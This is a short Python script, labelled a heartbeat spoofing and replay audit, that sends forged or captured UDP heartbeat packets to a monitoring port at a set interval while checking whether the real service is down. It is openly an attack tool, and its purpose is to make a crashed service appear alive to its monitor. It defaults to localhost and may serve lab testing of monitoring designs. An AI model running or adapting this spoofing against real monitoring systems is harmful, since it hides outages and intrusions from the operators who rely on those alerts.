import argparse
import socket
import time
from datetime import datetime

def now():
    return datetime.now().strftime("%H:%M:%S")

def service_alive(host, port):
    try:
        with socket.create_connection((host, port), timeout=0.5):
            return True

    except OSError:
        return False



def run_attack(mode, host, port, service_port, interval, duration, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    complete = time.monotonic() + duration if duration > 0 else None
    sent = 0

    print(f"[{now()}] Starting {mode.upper()} attack -> {host}:{port}")
    print(f"[{now()}] Payload: {payload!r}  interval: {interval}s")
    print("Press Ctrl+C to stop.\n")

    try: 
        while complete is None or time.monotonic() < complete:
            sock.sendto(payload, (host, port))
            sent += 1

            service = service_alive(host, service_port)
            status = "Alive" if service else "Down (Crashed)"
            print(f"[{now()}] Sent forged heartbeat #{sent} | "
                  f"real service status: {status}")
            time.sleep(interval)

    except KeyboardInterrupt:
        pass 
    finally:
        sock.close()

        print(f"\n[{now()}] Attack stopped. {sent} packets sent.")

def main():
    ap = argparse.ArgumentParser(description="Heartbeat spoofing / replay audit")
    ap.add_argument("mode", choices=["spoof", "replay"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=6000, help="monitor UDP port")
    ap.add_argument("--service-port", type=int, default=5000,
                    help="real service TCP port (used only to show it is dead)")
    ap.add_argument("--interval", type=float, default=1.0,
                    help="seconds between packets (match the service's period)")
    ap.add_argument("--duration", type=float, default=0,
                    help="seconds to run (0 = until Ctrl+C)")
    ap.add_argument("--payload", default="HEARTBEAT",
                    help="exact payload to send; for replay, paste a captured one")
    args = ap.parse_args()
 
    run_attack(args.mode, args.host, args.port, args.service_port,
               args.interval, args.duration, args.payload.encode())

if __name__ == "__main__":
    main()
